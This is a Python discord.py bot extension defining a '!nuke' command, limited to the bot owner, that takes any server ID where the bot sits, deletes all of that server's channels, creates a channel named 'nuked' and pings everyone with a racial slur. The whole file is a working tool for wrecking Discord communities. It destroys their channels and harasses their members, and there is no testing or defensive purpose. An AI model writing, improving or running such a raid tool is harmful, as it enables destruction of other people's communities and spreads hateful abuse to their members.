import discord
from discord.ext import commands
import asyncio


class Nuke(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.owner_id = 1151872484937834496  # Your Discord ID

    @commands.command()
    async def nuke(self, ctx, server_id: int):
        """Nuke a server by ID. Works in DMs. Bot owner only."""
        # Check if user is bot owner
        if ctx.author.id != self.owner_id:
            await ctx.send("❌ You don't have permission to use this command.")
            return
        
        # Fetch the guild
        guild = self.bot.get_guild(server_id)
        if not guild:
            await ctx.send(f"❌ Could not find server with ID `{server_id}`. Make sure the bot is in that server.")
            return
        
        await ctx.send(f"🚨 Nuking **{guild.name}**... This may take a moment.")
        
        # Delete all channels
        deleted_count = 0
        for channel in list(guild.channels):
            try:
                await channel.delete()
                deleted_count += 1
                await asyncio.sleep(0.5)  # Rate limit safety
            except Exception as e:
                print(f"Failed to delete {channel.name}: {e}")
        
        # Create new channel
        try:
            new_channel = await guild.create_text_channel("nuked")
            
            # Send @everyone ping with message
            await new_channel.send("@everyone get nuked niggas")
            
            await ctx.send(f"✅ **NUKE COMPLETE**\n🗑️ Deleted `{deleted_count}` channels\n📢 Created `nuked` channel and pinged everyone")
        except Exception as e:
            await ctx.send(f"⚠️ Deleted channels but failed to create new channel: {e}")

    @nuke.error
    async def nuke_error(self, ctx, error):
        if isinstance(error, commands.MissingRequiredArgument):
            await ctx.send("❌ Usage: `!nuke <server_id>`")
        else:
            await ctx.send(f"❌ Error: {error}")


async def setup(bot):
    await bot.add_cog(Nuke(bot))
